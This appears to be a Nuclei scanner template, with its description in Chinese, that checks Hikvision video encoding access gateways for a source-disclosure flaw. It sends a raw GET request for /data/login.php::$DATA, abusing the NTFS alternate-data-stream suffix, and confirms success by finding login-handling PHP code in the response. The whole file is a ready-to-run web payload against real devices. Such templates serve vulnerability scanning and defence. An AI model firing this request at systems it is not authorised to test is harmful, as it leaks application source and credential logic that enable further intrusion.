id: hikvision-gateway-data-file-read

info:
  name: HIKVISION 视频编码设备接入网关 $DATA 任意文件读取
  author: HuanXiong
  severity: high
  description: |
    HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码
    title="视频编码设备接入网关"

  tags: File Reading

http:
  - raw:
      - |
        GET /data/login.php::$DATA HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'DataBaseQuery();'
          - $_POST['userName'];
          - $_POST['password'];
        part: body
        condition: and